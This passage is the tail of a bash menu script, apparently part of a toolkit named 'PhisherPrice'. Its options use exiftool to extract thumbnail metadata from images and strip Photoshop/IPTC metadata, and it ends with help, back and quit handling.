!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool $exif8 -thumbnailimage -b | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      9)
      clear
      echo -e '
Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
'
read -e psd && echo "$psd" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -Photoshop:All= $psd

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      h|H)
clear
echo -e '\e[1;33m
\e[0m
 \e[1;31m
You can Put This Script In The Desired Folder You Like Where The Media
Is Located Then You can execute the script
when the script is in the media folder you want you can just type the
Image name Along with file type instead of typing the image location aswell
For eg: instead of /home/username/Pictures/lulz.png
I would just type : lulz.png
'
read -p "Press Enter to continue."
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
main_menu